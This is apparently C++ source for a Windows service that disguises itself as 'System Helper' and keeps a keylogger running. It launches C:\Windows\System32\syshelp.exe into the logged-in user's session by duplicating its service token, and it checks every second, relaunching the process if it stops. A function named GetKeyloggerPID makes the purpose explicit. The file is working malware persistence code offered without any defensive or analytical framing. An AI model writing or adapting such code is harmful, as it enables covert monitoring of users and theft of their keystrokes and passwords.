#include <Windows.h>
#include <userenv.h>
#include <wtsapi32.h>
#include <string>
#include <TlHelp32.h>

#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Wtsapi32.lib")

SERVICE_STATUS g_ServiceStatus{};
SERVICE_STATUS_HANDLE g_StatusHandle = nullptr;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

HANDLE hLogFile = nullptr;
void LogString(std::wstring wstr);

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
bool CreateProcessInUserSession(LPWSTR commandLine);

DWORD GetKeyloggerPID();

DWORD GetActiveUserSessionId(bool returnSession0 = false);

wchar_t serviceName[] = L"System Helper";

int wWinMain(HINSTANCE hInst, HINSTANCE hPrevInst, PWSTR cmdLine, int show)
{
	SERVICE_TABLE_ENTRYW ServiceTable[2] = {
		{serviceName, ServiceMain},
		{nullptr, nullptr}
	};

	StartServiceCtrlDispatcherW(ServiceTable);

	return GetLastError();
}

void LogString(std::wstring wstr)
{
	wstr += L'\n';
	if (!hLogFile || hLogFile == INVALID_HANDLE_VALUE)
		return;
	const wchar_t* buf = wstr.c_str();
	DWORD written{};
	WriteFile(hLogFile, buf, wstr.size() * sizeof(wchar_t), &written, nullptr);
}

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv)
{
	DWORD status = E_FAIL;

	g_StatusHandle = RegisterServiceCtrlHandlerW(serviceName, ServiceCtrlHandler);

	if (g_StatusHandle == nullptr)
		return;

	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL)
	{
		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;
		SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
	}

	HANDLE hThread = CreateThread(nullptr, 0,
		ServiceWorkerThread, nullptr, 0, nullptr);

	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}

	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwWin32ExitCode = GetLastError();
	SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD code)
{
	switch (code)
	{
	case SERVICE_CONTROL_STOP:

		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
			break;

		/*
		 * Perform tasks necessary to stop the service here
		 */

		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 4;

		SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

		SetEvent(g_ServiceStopEvent);

		break;

	default:
		break;
	}
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
	/*wchar_t fileName[] = LR"(C:\Temp\log.pol)";

	hLogFile = CreateFileW(fileName, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hLogFile == INVALID_HANDLE_VALUE)
		return 1;*/

	wchar_t cmdLine[] = LR"(C:\Windows\System32\syshelp.exe)";
	CreateProcessInUserSession(cmdLine);

	while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
	{
		if (GetKeyloggerPID() == 0)
			CreateProcessInUserSession(cmdLine);

		Sleep(1000);
	}

	if (hLogFile)
		CloseHandle(hLogFile);

	return 0;
}

bool CreateProcessInUserSession(LPWSTR commandLine)
{
	ULONGLONG tickCount = GetTickCount64();

	DWORD sessionId = 0xFFFFFFFF;
	do {
		sessionId = GetActiveUserSessionId();
		if ((GetTickCount64() - tickCount) > 10000) {
			return false;
		}
		if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0)
			return false;
		Sleep(10);
	} while (sessionId == 0xFFFFFFFF);

	LogString((L"Successfully selected session " + std::to_wstring(sessionId)));

	HANDLE hCurToken{};
	HANDLE hDupToken{};

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurToken))
		return false;

	if (!DuplicateTokenEx(hCurToken, MAXIMUM_ALLOWED, NULL,
		SecurityIdentification, TokenPrimary, &hDupToken))
	{
		CloseHandle(hCurToken);
		return false;
	}

	if (!SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(DWORD)))
	{
		CloseHandle(hDupToken);
		CloseHandle(hCurToken);
		return false;
	}

	LPVOID env{};
	CreateEnvironmentBlock(&env, hDupToken, FALSE);

	std::wstring cmdLine = L"cmd /c \"";
	cmdLine += commandLine;
	cmdLine += L"\"";

	wchar_t desktopName[] = L"winsta0\\default";
	STARTUPINFOW si = { sizeof(si) };
	si.lpDesktop = desktopName;
	PROCESS_INFORMATION pi{};

	if (CreateProcessAsUserW(
		hDupToken,
		nullptr,
		commandLine,
		nullptr,
		nullptr,
		FALSE,
		CREATE_UNICODE_ENVIRONMENT,
		env,
		nullptr,
		&si,
		&pi
	))
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		LogString(L"Successfully started the process!");
	}

	if (env)
		DestroyEnvironmentBlock(env);
	CloseHandle(hDupToken);
	CloseHandle(hCurToken);

	return true;
}

DWORD GetKeyloggerPID()
{
	PROCESSENTRY32W pe = { sizeof(pe) };
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32FirstW(hSnap, &pe)) 
	{
		do {
			if (_wcsicmp(pe.szExeFile, L"syshelp.exe") == 0) {
				CloseHandle(hSnap);
				return pe.th32ProcessID;
			}
		} while (Process32NextW(hSnap, &pe));
	}

	CloseHandle(hSnap);

	return 0;
}

DWORD GetActiveUserSessionId(bool returnSession0)
{
	DWORD sessionId = 0xFFFFFFFF;

	sessionId = WTSGetActiveConsoleSessionId();
	if (returnSession0)
	{
		if (sessionId != 0xFFFFFFFF) {
			return sessionId;
		}
	}
	else
		if (sessionId != 0xFFFFFFFF && sessionId != 0) {
			return sessionId;
		}

	PWTS_SESSION_INFO sessionInfo = nullptr;
	DWORD count = 0;

	if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessionInfo, &count)) {
		for (DWORD i = 0; i < count; i++) {
			if (returnSession0)
			{
				if (sessionInfo[i].State == WTSActive) {
					sessionId = sessionInfo[i].SessionId;
					break;
				}
			}
			else
				if (sessionInfo[i].State == WTSActive && sessionInfo[i].SessionId != 0) {
					sessionId = sessionInfo[i].SessionId;
					break;
				}
		}
		WTSFreeMemory(sessionInfo);
	}

	return sessionId;
}
